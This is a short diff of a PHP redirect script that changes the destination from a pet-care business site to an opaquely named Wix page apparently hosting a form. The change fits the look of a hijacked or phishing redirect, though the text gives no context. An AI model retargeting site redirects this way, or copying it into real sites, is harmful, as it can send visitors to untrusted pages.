@@ -1,4 +1,4 @@
 <?php
-header("Location: https://respect-pet-care.business.site");
+header("Location: https://formcrtl1.wixsite.com/new1");
 die();
 ?>
